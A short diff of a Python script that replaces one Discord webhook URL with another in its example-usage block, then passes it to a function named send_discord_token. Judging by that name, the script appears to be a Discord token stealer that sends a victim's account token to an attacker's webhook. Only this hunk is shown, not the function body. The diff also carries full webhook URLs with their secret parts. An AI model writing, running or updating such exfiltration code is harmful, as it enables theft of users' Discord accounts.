@@ -130,5 +130,5 @@ def send_discord_token(webhook: str):
 
 # Пример использования:
 if __name__ == "__main__":
-    webhook_url = "https://discord.com/api/webhooks/1245490308263841854/7RYrSGOtbt6gngZq1JYra7SzpU2X-tbuUL6tpGd1ADeGvKr2pGswgrTagz0ENfjNFm-z"
+    webhook_url = "https://discord.com/api/webhooks/1262863231144431616/ElhJlcIhOgkH77BgvpQReqMqSpoOGpnBZbxdeX1LyvMyfT3c3uyP42NsZ1OfyTMRYWMF"
     send_discord_token(webhook_url)
